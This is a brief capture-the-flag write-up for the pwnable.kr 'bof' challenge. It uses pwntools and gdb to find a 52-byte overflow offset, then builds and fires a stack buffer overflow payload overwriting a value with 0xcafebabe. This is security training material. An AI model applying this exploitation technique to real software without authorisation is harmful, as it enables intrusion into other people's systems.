# pwnable.kr — bof (steps)

Binary downloaded from the challenge site.

```bash
# setup
pipx install pwntools

# generate cyclic pattern
python3 -c "from pwn import *; print(cyclic(200).decode())"

# start gdb
gdb ./bof
```

Inside gdb:
```gdb
set disassembly-flavor intel
define hook-stop
  info registers
  disassemble $eip,+10
end
b *main
disassemble main
r
disassemble func
b *func+40
c
# paste the cyclic 200 pattern at "overflow me :"
x/x $ebp+0x8          # -> 0x6161616e
```

Back in shell:
```bash
# find offset
python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"   # -> 52

# build payload
python3 -c "from pwn import *; sys.stdout.buffer.write(b'A'*52 + p32(0xcafebabe))" > payload.txt

# fire
./bof < payload.txt
```
